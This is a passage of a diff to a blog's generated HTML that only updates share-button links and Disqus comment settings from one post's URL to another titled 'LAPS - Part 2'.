+      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f03%2flaps---part-2%2f">
         <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f02%2fred-team-infrastructure---aws-encrypted-ebs%2f">
+      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f03%2flaps---part-2%2f">
         <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f02%2fred-team-infrastructure---aws-encrypted-ebs%2f">
+      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f03%2flaps---part-2%2f">
         <i class="fa fa-twitter"></i><span>Share on Twitter</span>
       </a>
     </li>
@@ -896,9 +1137,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/rastamouse.me\/2018\/02\/red-team-infrastructure---aws-encrypted-ebs\/';
+          this.page.url = 'https:\/\/rastamouse.me\/2018\/03\/laps---part-2\/';
           
-            this.page.identifier = '\/2018\/02\/red-team-infrastructure---aws-encrypted-ebs\/'
+            this.page.identifier = '\/2018\/03\/laps---part-2\/'
           
         };
         (function() {
